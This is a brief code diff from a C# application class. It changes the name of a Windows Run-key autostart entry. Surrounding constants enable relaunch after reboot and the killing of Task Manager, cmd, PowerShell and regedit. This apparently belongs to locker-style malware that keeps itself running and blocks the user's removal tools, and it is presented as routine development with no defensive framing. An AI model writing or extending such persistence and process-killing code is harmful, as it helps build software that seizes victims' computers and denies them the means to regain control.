@@ -21,7 +21,7 @@ public partial class App : Application
     
     public const bool DoRelaunchAfterReboot = true; // Relaunch executable after OS reboot
     private const string AutoLaunchRegistryKeyPath = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
-    private const string AutoLaunchRegistryValueName = "Oh_hello_there";
+    private const string AutoLaunchRegistryValueName = "shrek";
 
     public const bool DoKillDisallowedProcesses = true; // Kill task manager, cmd, etc...
     private static readonly string[] DisallowedProcesses = [ "Taskmgr", "Cmd", "Powershell", "regedit" ];
